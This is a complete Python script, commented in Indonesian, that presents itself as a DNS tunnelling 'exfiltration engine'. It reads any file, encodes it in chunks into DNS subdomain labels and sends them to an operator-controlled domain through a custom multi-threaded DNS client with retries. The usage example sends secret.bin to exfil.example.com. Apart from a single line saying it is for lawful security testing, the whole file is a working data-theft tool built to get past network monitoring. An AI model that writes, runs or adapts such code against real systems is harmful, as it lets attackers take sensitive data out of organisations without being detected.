#!/usr/bin/env python3
"""
dns_tunnel.py
DNS TXT/A Record High-Throughput OOB Exfiltration Engine

Fitur:
- Encoding data ke subdomain (base32/base64url/hex)
- TXT record query + A record fallback
- Multi-threaded worker pool
- Retry dengan exponential backoff
- Chunking + sequence + checksum
- Progress reporting
- Graceful shutdown

Penggunaan:
    python3 dns_tunnel.py --domain exfil.example.com --file secret.bin \
        --nameserver 1.2.3.4 --encoding base32 --threads 16

Catatan: Gunakan hanya untuk pengujian keamanan yang sah.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import hashlib
import logging
import os
import random
import signal
import socket
import string
import struct
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Iterable, List, Optional, Tuple

# --------------------------------------------------------------------------
# Konfigurasi global
# --------------------------------------------------------------------------

LOG = logging.getLogger("dns_tunnel")

# Batas label DNS: 63 byte. Kita sisakan ruang untuk seq + checksum.
MAX_LABEL_LEN = 63
MAX_CHUNK_RAW = 32          # byte data mentah per label (aman untuk base32 -> 52 char)
RESERVED_HEADER = 4         # bytes: [seq:2][len:1][chk:1] (dalam bentuk ter-encode)

# --------------------------------------------------------------------------
# Signal handling untuk graceful shutdown
# --------------------------------------------------------------------------

_STOP_EVENT = threading.Event()


def _handle_signal(signum, frame):  # noqa: ARG001
    LOG.warning("Menerima signal %s, menghentikan...", signum)
    _STOP_EVENT.set()


# --------------------------------------------------------------------------
# Encoding helpers
# --------------------------------------------------------------------------

def _to_base32(data: bytes) -> str:
    return base64.b32encode(data).decode("ascii").rstrip("=").lower()


def _to_base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _to_hex(data: bytes) -> str:
    return data.hex()


ENCODERS = {
    "base32": _to_base32,
    "base64": _to_base64url,
    "hex": _to_hex,
}


# --------------------------------------------------------------------------
# Struktur data
# --------------------------------------------------------------------------

@dataclass
class Chunk:
    index: int
    total: int
    payload: bytes
    label: str = field(init=False)

    def __post_init__(self) -> None:
        # Format: <seq_hex><total_hex><chk_hex><data_b32>
        seq_hex = f"{self.index:04x}"
        tot_hex = f"{self.total:04x}"
        checksum = hashlib.sha1(self.payload).hexdigest()[:4]
        encoded = _to_base32(self.payload)
        label = f"{seq_hex}{tot_hex}{checksum}{encoded}"
        if len(label) > MAX_LABEL_LEN:
            # Fallback: pangkas payload agar muat
            max_b32 = MAX_LABEL_LEN - len(seq_hex) - len(tot_hex) - len(checksum)
            encoded = encoded[:max_b32]
            label = f"{seq_hex}{tot_hex}{checksum}{encoded}"
        self.label = label


@dataclass
class QueryResult:
    chunk: Chunk
    success: bool
    response: Optional[str] = None
    error: Optional[str] = None


# --------------------------------------------------------------------------
# DNS Client (pure socket, tanpa dependensi eksternal)
# --------------------------------------------------------------------------

class DNSClient:
    """Minimal DNS client untuk query TXT/A via UDP dengan fallback TCP."""

    def __init__(self, nameserver: str, timeout: float = 3.0, use_tcp_fallback: bool = True):
        self.nameserver = nameserver
        self.timeout = timeout
        self.use_tcp_fallback = use_tcp_fallback
        self._sock_lock = threading.Lock()

    # -------- low-level builders --------
    @staticmethod
    def _build_query(qname: str, qtype: int, qid: int) -> bytes:
        header = struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0)
        q = b""
        for part in qname.split("."):
            if not part:
                continue
            b = part.encode("idna")
            if len(b) > 63:
                raise ValueError(f"Label > 63 byte: {part!r}")
            q += struct.pack("!B", len(b)) + b
        q += b"\x00"
        q += struct.pack("!HH", qtype, 1)
        return header + q

    @staticmethod
    def _parse_name(data: bytes, offset: int) -> Tuple[str, int]:
        labels = []
        while True:
            if offset >= len(data):
                raise ValueError("Offset melebihi panjang paket")
            length = data[offset]
            offset += 1
            if length == 0:
                break
            if length & 0xC0:  # compression pointer
                if offset >= len(data):
                    raise ValueError("Compression pointer tidak lengkap")
                ptr = ((length & 0x3F) << 8) | data[offset]
                offset += 1
                sub, _ = DNSClient._parse_name(data, ptr)
                labels.append(sub)
                break
            if offset + length > len(data):
                raise ValueError("Label terpotong")
            labels.append(data[offset:offset + length].decode("idna", errors="replace"))
            offset += length
        return ".".join(labels), offset

    # -------- public API --------
    def query(self, qname: str, qtype: int = 16) -> Tuple[int, List[str]]:
        """Kirim query, kembalikan (rcode, list-of-record-strings)."""
        qid = random.randint(0, 0xFFFF)
        packet = self._build_query(qname, qtype, qid)

        response = self._udp(packet, qid)
        if response is None and self.use_tcp_fallback:
            response = self._tcp(packet, qid)
        if response is None:
            raise socket.timeout(f"Timeout query {qname}")

        return self._parse_response(response, qid)

    def _udp(self, packet: bytes, qid: int) -> Optional[bytes]:
        with self._sock_lock:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.settimeout(self.timeout)
                s.sendto(packet, (self.nameserver, 53))
                deadline = time.monotonic() + self.timeout
                while time.monotonic() < deadline:
                    try:
                        data, _ = s.recvfrom(4096)
                    except socket.timeout:
                        return None
                    if len(data) >= 2 and struct.unpack("!H", data[:2])[0] == qid:
                        return data
                return None
            finally:
                s.close()

    def _tcp(self, packet: bytes, qid: int) -> Optional[bytes]:
        try:
            with socket.create_connection((self.nameserver, 53), timeout=self.timeout) as s:
                s.settimeout(self.timeout)
                s.sendall(struct.pack("!H", len(packet)) + packet)
                length_data = self._recv_exact(s, 2)
                if length_data is None:
                    return None
                (length,) = struct.unpack("!H", length_data)
                resp = self._recv_exact(s, length)
                if resp is None:
                    return None
                if len(resp) >= 2 and struct.unpack("!H", resp[:2])[0] == qid:
                    return resp
        except (OSError, socket.timeout):
            return None
        return None

    @staticmethod
    def _recv_exact(sock: socket.socket, n: int) -> Optional[bytes]:
        buf = b""
        while len(buf) < n:
            try:
                part = sock.recv(n - len(buf))
            except socket.timeout:
                return None
            if not part:
                return None
            buf += part
        return buf

    def _parse_response(self, data: bytes, qid: int) -> Tuple[int, List[str]]:
        if len(data) < 12:
            raise ValueError("Paket DNS terlalu pendek")
        r_id, flags, qd, an, ns, ar = struct.unpack("!HHHHHH", data[:12])
        if r_id != qid:
            raise ValueError("Query ID tidak cocok")
        rcode = flags & 0x000F
        offset = 12
        for _ in range(qd):
            _, offset = self._parse_name(data, offset)
            offset += 4
        records: List[str] = []
        for _ in range(an):
            _, offset = self._parse_name(data, offset)
            if offset + 10 > len(data):
                break
            rtype, _rclass, _ttl, rdlen = struct.unpack("!HHIH", data[offset:offset + 10])
            offset += 10
            rdata = data[offset:offset + rdlen]
            offset += rdlen
            if rtype == 16:  # TXT
                txt = self._parse_txt(rdata)
                if txt:
                    records.append(txt)
            elif rtype == 1 and rdlen == 4:  # A
                records.append(socket.inet_ntoa(rdata))
        return rcode, records

    @staticmethod
    def _parse_txt(rdata: bytes) -> str:
        out = []
        i = 0
        while i < len(rdata):
            ln = rdata[i]
            i += 1
            if i + ln > len(rdata):
                break
            out.append(rdata[i:i + ln].decode("utf-8", errors="replace"))
            i += ln
        return "".join(out)


# --------------------------------------------------------------------------
# File loader & splitter
# --------------------------------------------------------------------------

def read_file(path: str) -> bytes:
    if path == "-":
        return sys.stdin.buffer.read()
    with open(path, "rb") as f:
        return f.read()


def split_chunks(data: bytes, chunk_size: int) -> List[Chunk]:
    total = (len(data) + chunk_size - 1) // chunk_size
    if total == 0:
        return []
    if total > 0xFFFF:
        raise ValueError(
            f"File terlalu besar: {total} chunk > 65535. Perbesar chunk_size."
        )
    chunks: List[Chunk] = []
    for i in range(total):
        payload = data[i * chunk_size:(i + 1) * chunk_size]
        chunks.append(Chunk(index=i, total=total, payload=payload))
    return chunks


# --------------------------------------------------------------------------
# Worker
# --------------------------------------------------------------------------

class TunnelWorker(threading.Thread):
    def __init__(
        self,
        name: str,
        client: DNSClient,
        domain: str,
        queue: "list[Chunk]",
        queue_lock: threading.Lock,
        results: "list[QueryResult]",
        results_lock: threading.Lock,
        retries: int,
        qtype: int,
    ):
        super().__init__(name=name, daemon=True)
        self.client = client
        self.domain = domain
        self.queue = queue
        self.queue_lock = queue_lock
        self.results = results
        self.results_lock = results_lock
        self.retries = retries
        self.qtype = qtype

    def _next_chunk(self) -> Optional[Chunk]:
        with self.queue_lock:
            if not self.queue:
                return None
            return self.queue.pop()

    def _build_qname(self, chunk: Chunk) -> str:
        return f"{chunk.label}.{self.domain}"

    def _query_with_retry(self, chunk: Chunk) -> QueryResult:
        qname = self._build_qname(chunk)
        last_err = None
        for attempt in range(self.retries + 1):
            if _STOP_EVENT.is_set():
                return QueryResult(chunk, False, error="dihentikan")
            try:
                rcode, records = self.client.query(qname, qtype=self.qtype)
                if rcode == 0 and records:
                    return QueryResult(chunk, True, response=records[0])
                last_err = f"rcode={rcode}, records={len(records)}"
            except (socket.timeout, OSError, ValueError) as e:
                last_err = f"{type(e).__name__}: {e}"
            # exponential backoff + jitter
            delay = min(2 ** attempt * 0.1, 2.0) + random.uniform(0, 0.05)
            time.sleep(delay)
        return QueryResult(chunk, False, error=last_err)

    def run(self) -> None:
        while not _STOP_EVENT.is_set():
            chunk = self._next_chunk()
            if chunk is None:
                return
            result = self._query_with_retry(chunk)
            with self.results_lock:
                self.results.append(result)


# --------------------------------------------------------------------------
# Orchestrator
# --------------------------------------------------------------------------

def exfiltrate(
    file_path: str,
    domain: str,
    nameserver: str,
    chunk_size: int = MAX_CHUNK_RAW,
    threads: int = 8,
    retries: int = 3,
    qtype: int = 16,
    timeout: float = 3.0,
) -> int:
    data = read_file(file_path)
    if not data:
        LOG.error("File kosong atau tidak terbaca: %s", file_path)
        return 2

    LOG.info("Ukuran file: %d byte", len(data))
    digest = hashlib.sha256(data).hexdigest()
    LOG.info("SHA256: %s", digest)

    try:
        chunks = split_chunks(data, chunk_size)
    except ValueError as e:
        LOG.error("Gagal split chunk: %s", e)
        return 2

    LOG.info("Total chunk: %d (chunk_size=%d)", len(chunks), chunk_size)

    client = DNSClient(nameserver, timeout=timeout)
    queue: List[Chunk] = list(chunks)
    queue.reverse()  # pop() dari belakang -> urutan naik
    queue_lock = threading.Lock()
    results: List[QueryResult] = []
    results_lock = threading.Lock()

    workers = [
        TunnelWorker(
            name=f"w{i}",
            client=client,
            domain=domain,
            queue=queue,
            queue_lock=queue_lock,
            results=results,
            results_lock=results_lock,
            retries=retries,
            qtype=qtype,
        )
        for i in range(max(1, threads))
    ]

    start = time.monotonic()
    for w in workers:
        w.start()

    last_done = -1
    while any(w.is_alive() for w in workers):
        time.sleep(0.2)
        with results_lock:
            done = len(results)
        if done != last_done:
            elapsed = time.monotonic() - start
            rate = done / elapsed if elapsed > 0 else 0.0
            LOG.info(
                "Progress: %d/%d (%.1f%%) %.1f chunk/s",
                done,
                len(chunks),
                (done / len(chunks)) * 100 if chunks else 0.0,
                rate,
            )
            last_done = done
        if _STOP_EVENT.is_set():
            break

    for w in workers:
        w.join(timeout=5.0)

    ok = sum(1 for r in results if r.success)
    fail = len(results) - ok
    elapsed = time.monotonic() - start
    LOG.info("Selesai: %d sukses, %d gagal, %.2fs", ok, fail, elapsed)

    if fail:
        LOG.error("Chunk gagal (index): %s",
                  sorted({r.chunk.index for r in results if not r.success})[:20])
        return 1
    return 0


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="DNS TXT/A High-Throughput OOB Exfiltration Engine",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--domain", required=True, help="Domain tunnel (exfil.example.com)")
    p.add_argument("--file", required=True, help="File sumber, '-' untuk stdin")
    p.add_argument("--nameserver", required=True, help="IP nameserver target")
    p.add_argument("--chunk-size", type=int, default=MAX_CHUNK_RAW,
                   help="Byte mentah per chunk")
    p.add_argument("--threads", type=int, default=8, help="Jumlah worker thread")
    p.add_argument("--retries", type=int, default=3, help="Retry per chunk")
    p.add_argument("--qtype", choices=["txt", "a"], default="txt",
                   help="Tipe record DNS")
    p.add_argument("--timeout", type=float, default=3.0, help="Timeout query (detik)")
    p.add_argument("--verbose", "-v", action="store_true", help="Log debug")
    return p


def main(argv: Optional[Iterable[str]] = None) -> int:
    args = build_parser().parse_args(list(argv) if argv is not None else None)

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    if not 0 < args.chunk_size <= MAX_CHUNK_RAW:
        LOG.error("chunk-size harus 1..%d", MAX_CHUNK_RAW)
        return 2
    if args.threads < 1:
        LOG.error("threads harus >= 1")
        return 2

    qtype = 16 if args.qtype == "txt" else 1

    signal.signal(signal.SIGINT, _handle_signal)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _handle_signal)

    try:
        return exfiltrate(
            file_path=args.file,
            domain=args.domain,
            nameserver=args.nameserver,
            chunk_size=args.chunk_size,
            threads=args.threads,
            retries=args.retries,
            qtype=qtype,
            timeout=args.timeout,
        )
    except KeyboardInterrupt:
        LOG.warning("Dihentikan oleh user")
        return 130


if __name__ == "__main__":
    sys.exit(main())